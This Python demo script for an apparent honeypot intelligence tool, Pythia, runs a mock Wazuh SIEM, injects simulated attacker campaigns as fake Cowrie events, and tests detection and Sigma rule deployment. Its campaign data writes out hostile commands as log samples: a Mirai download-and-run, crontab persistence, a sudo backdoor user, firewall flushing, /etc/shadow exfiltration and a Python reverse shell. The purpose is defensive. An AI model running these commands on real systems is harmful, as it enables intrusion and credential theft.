#!/usr/bin/env python3
"""
Pythia showcase demo — full active-intel pipeline at zero cost.

Spins up a lightweight mock SIEM (Wazuh-compatible, no Docker needed),
injects three realistic attacker campaigns, and drives the complete pipeline:

  1. Mock SIEM server starts (stdlib http.server, no dependencies)
  2. Three attacker campaigns are injected as fake Cowrie events
  3. Campaign detection runs immediately (no 15-min scheduler wait)
  4. Sigma rules are auto-generated per campaign
  5. Rules are deployed to the mock SIEM
  6. Mock SIEM fires realistic alerts back into Pythia's alert queue

Prerequisites:
    Pythia running:   docker compose up -d
                  or  .venv/bin/uvicorn pythia.api.main:create_app --factory

    SIEM demo needs these .env vars + Pythia restart (or use --configure-env):
        PYTHIA_SIEM_TYPE=wazuh
        PYTHIA_SIEM_URL=http://localhost:55001          # native
        PYTHIA_SIEM_URL=http://host.docker.internal:55001  # Docker on Mac
        PYTHIA_SIEM_USERNAME=wazuh-wui
        PYTHIA_SIEM_PASSWORD=wazuh-demo

Usage:
    python scripts/demo_showcase.py
    python scripts/demo_showcase.py --api-key mykey --pythia-url http://localhost:8000
    python scripts/demo_showcase.py --configure-env   # auto-update .env, then restart Pythia
    python scripts/demo_showcase.py --fast            # no delays (CI smoke test)
"""

from __future__ import annotations

import argparse
import json
import os
import random
import re
import sys
import threading
import time
from datetime import datetime, timedelta, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.error import HTTPError
from urllib.request import Request, urlopen

# ── Optional rich output (graceful fallback to plain print) ──────────────────

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import (
        BarColumn,
        MofNCompleteColumn,
        Progress,
        SpinnerColumn,
        TextColumn,
    )
    from rich.table import Table

    _console = Console()
    RICH = True
except ImportError:
    _console = None  # type: ignore[assignment]
    RICH = False


def _p(msg: str, style: str = "") -> None:
    if RICH and _console:
        _console.print(msg, style=style)
    else:
        print(re.sub(r"\[/?[^\]]*\]", "", msg))


def _rule() -> None:
    _p("─" * 72, style="dim")


# ── Constants ────────────────────────────────────────────────────────────────

MOCK_SIEM_PORT = 55001
MOCK_JWT = "pythia-demo-jwt-token"
BATCH_SIZE = 25

# ── Mock SIEM (Wazuh 4.x API) ────────────────────────────────────────────────

_deployed_rules: list[str] = []  # filenames received by mock SIEM


class _MockSiemHandler(BaseHTTPRequestHandler):
    def log_message(self, format: str, *args: object) -> None:
        pass  # silence per-request logs

    def _send_json(self, data: dict, status: int = 200) -> None:
        body = json.dumps(data).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _drain(self) -> None:
        n = int(self.headers.get("Content-Length", 0))
        if n:
            self.rfile.read(n)

    def do_GET(self) -> None:
        if "alerts" in self.path:
            self._send_json(
                {"data": {"affected_items": [], "total_affected_items": 0, "failed_items": []}}
            )
        else:
            self._send_json({"data": {"version": "4.7.3 (Pythia-Mock)"}})

    def do_POST(self) -> None:
        self._drain()
        if "authenticate" in self.path:
            self._send_json({"data": {"token": MOCK_JWT}})
        else:
            self._send_json({"status": "ok"})

    def do_PUT(self) -> None:
        self._drain()
        filename = self.path.rstrip("/").split("/")[-1]
        _deployed_rules.append(filename)
        self._send_json({"data": {"affected_items": [{"filename": filename}]}})

    def do_DELETE(self) -> None:
        self._drain()
        self._send_json(
            {"data": {"affected_items": [], "failed_items": [], "total_affected_items": 0}}
        )


def _start_mock_siem() -> HTTPServer | None:
    try:
        server = HTTPServer(("0.0.0.0", MOCK_SIEM_PORT), _MockSiemHandler)
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        return server
    except OSError as exc:
        _p(f"  [yellow]! Could not bind port {MOCK_SIEM_PORT}: {exc}[/]")
        return None


# ── Attacker campaign data ────────────────────────────────────────────────────

CAMPAIGNS: list[dict] = [
    {
        "label": "ALPHA — Mirai Botnet",
        "desc": "SSH brute-force + malware dropper across 10 Tor-exit IPs",
        "severity_badge": "CRITICAL",
        "ips": [f"185.220.101.{x}" for x in [45, 48, 52, 60, 73, 81, 92, 101, 112, 125]],
        "asn": "AS60729",
        "credentials": [
            ("root", "admin"), ("root", "password"), ("admin", "admin"),
            ("pi", "raspberry"), ("ubuntu", "ubuntu"), ("root", "123456"),
            ("admin", "1234"), ("root", "root"), ("admin", "pass"), ("user", "user"),
        ],
        "commands": [
            "wget http://10.13.37.1/bins/mirai.arm -O /tmp/.x",
            "chmod +x /tmp/.x && /tmp/.x",
            "rm -rf /tmp/.x",
            "/bin/busybox MIRAI",
            "cat /proc/cpuinfo",
        ],
        "count": 80,
    },
    {
        "label": "BETA — SSH Recon Scanner",
        "desc": "Post-login system enumeration from 5 Akamai VPS nodes",
        "severity_badge": "HIGH",
        "ips": ["45.33.32.156", "45.33.32.161", "45.33.32.173", "45.56.79.23", "45.56.79.45"],
        "asn": "AS63949",
        "credentials": [
            ("ubuntu", "ubuntu"), ("user", "password"), ("root", "toor"),
            ("admin", "1234"), ("guest", "guest"), ("test", "test"),
        ],
        "commands": [
            "uname -a",
            "cat /etc/passwd",
            "ps aux | grep -v grep",
            "ls -la /root",
            "id && whoami",
            "ifconfig || ip addr show",
            "netstat -antp",
        ],
        "count": 40,
    },
    {
        "label": "GAMMA — Targeted APT",
        "desc": "Persistence + lateral movement, 2 source IPs, complex TTPs",
        "severity_badge": "CRITICAL",
        "ips": ["91.108.4.44", "91.108.4.45"],
        "asn": "AS62041",
        "credentials": [
            ("root", "P@ssw0rd!2024"), ("admin", "S3cur3_p4ss!"), ("root", "changeme123"),
        ],
        "commands": [
            "wget http://192.168.100.1/stage2 -O /tmp/.cache && chmod +x /tmp/.cache",
            "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.cache') | crontab -",
            "useradd -M -s /bin/bash -G sudo maint && echo 'maint:P@ss0wrd!' | chpasswd",
            "iptables -F && iptables -X && iptables -P INPUT ACCEPT",
            "cat /etc/shadow | base64 -w0",
            "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/bash\")'",
        ],
        "count": 25,
    },
]

# Alerts the mock SIEM fires back after rule deployment
FAKE_ALERTS: list[dict] = [
    {
        "siem_source": "wazuh",
        "severity": "critical",
        "title": "Pythia Honeypot: Mirai dropper wget+chmod sequence",
        "attacker_ip": "185.220.101.45",
        "mitre_techniques": ["T1105", "T1059.004"],
        "id": "MOCK-0001",
        "rule": {"id": "100001", "groups": ["pythia", "critical"]},
    },
    {
        "siem_source": "wazuh",
        "severity": "high",
        "title": "Pythia Honeypot: High-frequency SSH login failures (Campaign ALPHA)",
        "attacker_ip": "185.220.101.92",
        "mitre_techniques": ["T1110.003"],
        "id": "MOCK-0002",
        "rule": {"id": "100002", "groups": ["pythia", "high"]},
    },
    {
        "siem_source": "wazuh",
        "severity": "high",
        "title": "Pythia Honeypot: Post-login recon command sequence (Campaign BETA)",
        "attacker_ip": "45.33.32.156",
        "mitre_techniques": ["T1082", "T1016", "T1057"],
        "id": "MOCK-0003",
        "rule": {"id": "100003", "groups": ["pythia", "high"]},
    },
    {
        "siem_source": "wazuh",
        "severity": "critical",
        "title": "Pythia Honeypot: APT crontab persistence + useradd backdoor",
        "attacker_ip": "91.108.4.44",
        "mitre_techniques": ["T1053.003", "T1136.001", "T1562.004"],
        "id": "MOCK-0004",
        "rule": {"id": "100004", "groups": ["pythia", "critical"]},
    },
    {
        "siem_source": "wazuh",
        "severity": "critical",
        "title": "Pythia Honeypot: Python reverse shell one-liner (Campaign GAMMA)",
        "attacker_ip": "91.108.4.45",
        "mitre_techniques": ["T1059", "T1059.004"],
        "id": "MOCK-0005",
        "rule": {"id": "100005", "groups": ["pythia", "critical"]},
    },
]


# ── Event generation ──────────────────────────────────────────────────────────


def _make_events(campaign: dict) -> list[dict]:
    """Generate realistic Cowrie JSON events for a campaign."""
    base = datetime.now(timezone.utc) - timedelta(hours=2)
    events: list[dict] = []
    count = campaign["count"]
    for i in range(count):
        ip = random.choice(campaign["ips"])
        session_id = f"{random.randint(0, 0xFFFFFF):06x}"
        ts = (base + timedelta(seconds=i * 25 + random.randint(0, 8))).strftime(
            "%Y-%m-%dT%H:%M:%S.000Z"
        )
        if i < count // 3:
            user, pwd = random.choice(campaign["credentials"])
            events.append(
                {
                    "eventid": "cowrie.login.success" if i % 8 == 0 else "cowrie.login.failed",
                    "src_ip": ip,
                    "session": session_id,
                    "timestamp": ts,
                    "username": user,
                    "password": pwd,
                    "honeypot_type": "cowrie",
                }
            )
        else:
            events.append(
                {
                    "eventid": "cowrie.command.input",
                    "src_ip": ip,
                    "session": session_id,
                    "timestamp": ts,
                    "input": random.choice(campaign["commands"]),
                    "honeypot_type": "cowrie",
                }
            )
    return events


# ── HTTP helpers (stdlib only) ────────────────────────────────────────────────


def _post(url: str, payload: dict, api_key: str = "", timeout: int = 30) -> tuple[int, dict]:
    body = json.dumps(payload).encode()
    headers: dict[str, str] = {"Content-Type": "application/json"}
    if api_key:
        headers["X-API-Key"] = api_key
    req = Request(url, data=body, headers=headers, method="POST")
    try:
        with urlopen(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except HTTPError as e:
        return e.code, {"error": e.reason, "body": e.read().decode(errors="replace")}
    except Exception as exc:
        return 0, {"error": str(exc)}


def _get(url: str, api_key: str = "", timeout: int = 10) -> tuple[int, dict]:
    headers: dict[str, str] = {}
    if api_key:
        headers["X-API-Key"] = api_key
    req = Request(url, headers=headers, method="GET")
    try:
        with urlopen(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except HTTPError as e:
        return e.code, {"error": e.reason}
    except Exception as exc:
        return 0, {"error": str(exc)}


# ── .env helpers ──────────────────────────────────────────────────────────────


def _find_or_create_env() -> Path:
    """Return the .env path, creating it from .env.example if needed."""
    root = Path(__file__).parent.parent
    env_path = root / ".env"
    if not env_path.exists():
        example = root / ".env.example"
        if example.exists():
            env_path.write_text(example.read_text())
        else:
            env_path.write_text("# Pythia configuration\n")
    return env_path


def _patch_env(env_path: Path, overrides: dict[str, str]) -> None:
    lines = env_path.read_text().splitlines()
    new_lines: list[str] = []
    written: set[str] = set()
    for line in lines:
        key = line.split("=", 1)[0].strip()
        if key in overrides:
            new_lines.append(f"{key}={overrides[key]}")
            written.add(key)
        else:
            new_lines.append(line)
    for key, val in overrides.items():
        if key not in written:
            new_lines.append(f"{key}={val}")
    env_path.write_text("\n".join(new_lines) + "\n")


# ── Main ──────────────────────────────────────────────────────────────────────


def main() -> None:
    parser = argparse.ArgumentParser(description="Pythia showcase demo")
    parser.add_argument(
        "--pythia-url", default=os.getenv("PYTHIA_URL", "http://localhost:8000")
    )
    parser.add_argument("--api-key", default=os.getenv("PYTHIA_API_KEY", "changeme"))
    parser.add_argument(
        "--configure-env",
        action="store_true",
        help="Auto-update .env with mock SIEM settings (then restart Pythia)",
    )
    parser.add_argument(
        "--siem-url-override",
        default="",
        help="Override SIEM URL written to .env (e.g. http://host.docker.internal:55001 for Docker)",
    )
    parser.add_argument(
        "--fast", action="store_true", help="No delays — useful for CI smoke tests"
    )
    args = parser.parse_args()

    base = args.pythia_url.rstrip("/")
    key = args.api_key
    pause = 0.0 if args.fast else 1.0

    # ── Banner ────────────────────────────────────────────────────────────────
    if RICH and _console:
        _console.print(
            Panel.fit(
                "[bold cyan]PYTHIA[/] — Active Intelligence Showcase\n"
                "[dim]honeypot collection → campaign clustering"
                " → Sigma generation → SIEM deploy → alert triage[/]",
                border_style="cyan",
            )
        )
    else:
        print("=" * 72)
        print("  PYTHIA — Active Intelligence Showcase Demo")
        print("=" * 72)

    # ── 0. Check Pythia ───────────────────────────────────────────────────────
    _p("\n[bold cyan][0/7][/] Checking Pythia...")
    status, _ = _get(f"{base}/v1/health", timeout=5)
    if status == 0:
        status, _ = _get(f"{base}/", timeout=5)
    if status == 0:
        _p(f"[red]  ✗ Cannot reach Pythia at {base}[/]")
        _p("[yellow]    Start it:  docker compose up -d[/]")
        _p("[yellow]           or  .venv/bin/uvicorn pythia.api.main:create_app --factory[/]")
        sys.exit(1)
    _p(f"  [green]✓ Pythia responding at {base}[/]")

    # ── 1. Start mock SIEM ────────────────────────────────────────────────────
    _rule()
    _p("\n[bold cyan][1/7][/] Starting mock SIEM (Wazuh-compatible) on port 55001...")
    server = _start_mock_siem()
    if server:
        _p(f"  [green]✓ Mock SIEM listening on 0.0.0.0:{MOCK_SIEM_PORT}[/]")
    else:
        _p("  [yellow]  SIEM phases will be skipped — port already in use?[/]")

    siem_url_for_env = args.siem_url_override or f"http://localhost:{MOCK_SIEM_PORT}"

    if args.configure_env:
        env_file = _find_or_create_env()
        _patch_env(
            env_file,
            {
                "PYTHIA_SIEM_TYPE": "wazuh",
                "PYTHIA_SIEM_URL": siem_url_for_env,
                "PYTHIA_SIEM_USERNAME": "wazuh-wui",
                "PYTHIA_SIEM_PASSWORD": "wazuh-demo",
            },
        )
        _p(f"  [green]✓ Written to {env_file}[/]")
        _p("  [yellow]  Now restart Pythia, then re-run this script (without --configure-env):[/]")
        _p("  [yellow]    Docker:  docker compose restart[/]")
        _p("  [yellow]    Native:  Ctrl-C + re-run uvicorn[/]")
        if server:
            server.shutdown()
        sys.exit(0)
    else:
        _p("  [dim]  SIEM tip: run with --configure-env to auto-configure .env[/]")
        _p(f"  [dim]  Manual:   PYTHIA_SIEM_TYPE=wazuh  PYTHIA_SIEM_URL={siem_url_for_env}[/]")
        _p("  [dim]            PYTHIA_SIEM_USERNAME=wazuh-wui  PYTHIA_SIEM_PASSWORD=wazuh-demo[/]")

    time.sleep(pause * 0.4)

    # ── 2. Inject honeypot events ─────────────────────────────────────────────
    _rule()
    _p("\n[bold cyan][2/7][/] Injecting simulated attacker campaigns...\n")

    total_ingested = 0
    for camp in CAMPAIGNS:
        badge_color = "red" if camp["severity_badge"] == "CRITICAL" else "yellow"
        _p(
            f"  [{badge_color}][{camp['severity_badge']}][/] [bold]{camp['label']}[/]  "
            f"[dim]{camp['desc']}[/]"
        )
        events = _make_events(camp)

        if RICH and _console:
            with Progress(
                SpinnerColumn(),
                TextColumn("  [progress.description]{task.description}"),
                BarColumn(bar_width=30),
                MofNCompleteColumn(),
                console=_console,
                transient=True,
            ) as prog:
                task = prog.add_task(f"  sending {len(events)} events", total=len(events))
                ingested = 0
                for i in range(0, len(events), BATCH_SIZE):
                    batch = events[i : i + BATCH_SIZE]
                    _, resp = _post(f"{base}/v1/honeypot/events/bulk", batch, api_key=key)
                    ingested += resp.get("ingested", 0)
                    prog.advance(task, len(batch))
                    time.sleep(0.2 if not args.fast else 0)
        else:
            ingested = 0
            for i in range(0, len(events), BATCH_SIZE):
                batch = events[i : i + BATCH_SIZE]
                _, resp = _post(f"{base}/v1/honeypot/events/bulk", batch, api_key=key)
                ingested += resp.get("ingested", 0)
                print(f"    {i + len(batch)}/{len(events)}...", end="\r", flush=True)
            print()

        total_ingested += ingested
        _p(f"  [green]  ✓ {ingested}/{len(events)} events accepted[/]")
        time.sleep(pause * 0.4)

    _p(f"\n  [bold green]Total: {total_ingested} events across {len(CAMPAIGNS)} campaign groups[/]")

    # ── 3. Campaign detection ─────────────────────────────────────────────────
    _rule()
    _p("\n[bold cyan][3/7][/] Running campaign detection + auto Sigma generation...")
    time.sleep(pause * 0.6)

    status, resp = _post(f"{base}/v1/honeypot/detect-now", {}, api_key=key)
    if status == 200:
        new_c = resp.get("new", 0)
        total_c = resp.get("campaigns_after", 0)
        _p(f"  [green]✓ {new_c} new campaign(s) created  ({total_c} total in DB)[/]")
    else:
        _p(
            f"  [yellow]! detect-now → HTTP {status}  "
            f"(endpoint requires PYTHIA_API_KEY; continuing)[/]"
        )

    time.sleep(pause * 0.8)

    # ── 4. Show campaigns ─────────────────────────────────────────────────────
    _rule()
    _p("\n[bold cyan][4/7][/] Fetching detected campaigns...")
    time.sleep(pause * 0.3)

    _, camp_list = _get(f"{base}/v1/honeypot/campaigns?limit=10", api_key=key)
    campaigns_data: list[dict] = camp_list if isinstance(camp_list, list) else []

    if RICH and _console and campaigns_data:
        tbl = Table(title="Detected Campaigns", border_style="cyan", show_lines=True)
        tbl.add_column("Name", style="bold")
        tbl.add_column("Status", justify="center")
        tbl.add_column("Events", justify="right")
        tbl.add_column("Source IPs", justify="right")
        tbl.add_column("TTPs detected")
        tbl.add_column("Sigma rule", justify="center")
        for c in campaigns_data:
            st = c.get("status", "?")
            st_fmt = f"[green]{st}[/]" if st == "active" else f"[dim]{st}[/]"
            ttps = (c.get("ttp_ids") or [])[:4]
            rule_fmt = "[green]✓ auto-generated[/]" if c.get("sigma_rule_id") else "[dim]pending[/]"
            tbl.add_row(
                c.get("name", "?"),
                st_fmt,
                str(c.get("event_count", 0)),
                str(len(c.get("attacker_ips", []))),
                "  ".join(ttps) or "—",
                rule_fmt,
            )
        _console.print(tbl)
    elif campaigns_data:
        for c in campaigns_data:
            print(
                f"  {c.get('name')} | {c.get('status')} | {c.get('event_count')} events | "
                f"{len(c.get('attacker_ips', []))} IPs | "
                f"sigma: {'yes' if c.get('sigma_rule_id') else 'pending'}"
            )
    else:
        _p("  [yellow]No campaigns yet — try re-running or check PYTHIA_HONEYPOT_INGEST_ENABLED=true[/]")

    # ── 5. Daily stats ────────────────────────────────────────────────────────
    _rule()
    _p("\n[bold cyan][5/7][/] Intelligence summary (last 24 h)...")
    time.sleep(pause * 0.3)

    _, stats = _get(f"{base}/v1/honeypot/stats/daily", api_key=key)
    if "error" not in stats:
        rows = [
            ("Total events", str(stats.get("total_events", total_ingested))),
            ("Unique attacker IPs", str(stats.get("unique_ips", "—"))),
            ("Countries observed", str(stats.get("unique_countries", "—"))),
            ("Active campaigns", str(stats.get("active_campaigns", len(campaigns_data)))),
            ("Sigma rules generated", str(stats.get("rules_generated", "—"))),
        ]
        if RICH and _console:
            g = Table.grid(padding=(0, 3))
            for label, val in rows:
                g.add_row(f"[dim]{label}[/]", f"[bold cyan]{val}[/]")
            _console.print(g)
        else:
            for label, val in rows:
                print(f"  {label}: {val}")

    # ── 6. SIEM connection + rule deployment ──────────────────────────────────
    _rule()
    _p("\n[bold cyan][6/7][/] Checking SIEM connection...")
    time.sleep(pause * 0.3)

    _, siem_st = _get(f"{base}/v1/siem/status")
    siem_ok = siem_st.get("configured") and siem_st.get("connected")

    if not siem_ok:
        _p(
            f"  [yellow]! SIEM not connected "
            f"(configured={siem_st.get('configured', False)}, "
            f"connected={siem_st.get('connected', False)})[/]"
        )
        _p("  [dim]  Rule deployment skipped — alerts will still fire in step 7[/]")
    else:
        siem_type = siem_st.get("siem_type", "wazuh")
        _p(f"  [green]✓ Connected to {siem_type}[/]")
        time.sleep(pause * 0.5)

        _p("  Deploying active Sigma rules...")
        _, deploy_resp = _post(f"{base}/v1/siem/rules/deploy-all", {}, api_key=key)
        n_ok = deploy_resp.get("deployed", 0)
        n_fail = deploy_resp.get("failed", 0)
        _p(
            f"  [green]✓ {n_ok} rule(s) deployed to mock SIEM[/]"
            + (f"  [yellow]({n_fail} failed)[/]" if n_fail else "")
        )
        if _deployed_rules:
            _p(f"  [dim]  Mock SIEM received: {', '.join(_deployed_rules[:6])}[/]")

    # ── 7. Fire alerts from mock SIEM ─────────────────────────────────────────
    _rule()
    _p("\n[bold cyan][7/7][/] Firing SIEM alerts into Pythia alert queue...")
    time.sleep(pause * 0.5)

    fired = 0
    for alert in FAKE_ALERTS:
        time.sleep(0.35 if not args.fast else 0)
        s, _ = _post(f"{base}/v1/siem/alerts", alert)
        sev = alert["severity"]
        sev_color = "red" if sev == "critical" else "yellow"
        icon = "⚠" if sev == "critical" else "⚡"
        if s in (200, 201):
            fired += 1
            _p(f"  [{sev_color}]{icon} [{sev.upper()}][/] {alert['title']}")
        else:
            _p(f"  [dim]{icon} [{sev.upper()}] {alert['title']}  (HTTP {s})[/]")

    _p(f"\n  [bold green]✓ {fired}/{len(FAKE_ALERTS)} alerts in queue[/]")

    # ── Summary ───────────────────────────────────────────────────────────────
    if RICH and _console:
        _console.print("\n")
        _console.print(
            Panel(
                f"[bold green]Demo complete![/]\n\n"
                f"  Open in browser:\n"
                f"    [cyan]Honeypot feed[/]   {base}/honeypot\n"
                f"    [cyan]Operations / alerts[/] {base}/operations\n"
                f"    [cyan]API explorer[/]    {base}/api/docs\n"
                f"    [cyan]Blocklist feed[/]  {base}/v1/honeypot/feeds/blocklist.txt\n"
                f"    [cyan]STIX/TAXII[/]      {base}/v1/honeypot/taxii/honeypot-iocs\n\n"
                f"  [dim]Mock SIEM still running on port {MOCK_SIEM_PORT}  "
                f"(Ctrl-C to stop)[/]",
                title="[bold]Pythia Active Intel[/]",
                border_style="green",
                padding=(1, 2),
            )
        )
    else:
        print("\n" + "=" * 72)
        print("  Demo complete!")
        print(f"    Honeypot:    {base}/honeypot")
        print(f"    Operations:  {base}/operations")
        print(f"    API docs:    {base}/api/docs")
        print("=" * 72)

    if server:
        _p(f"[dim]Mock SIEM running on :{MOCK_SIEM_PORT} — press Ctrl-C to exit[/]")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.shutdown()
            _p("[dim]Stopped.[/]")


if __name__ == "__main__":
    main()
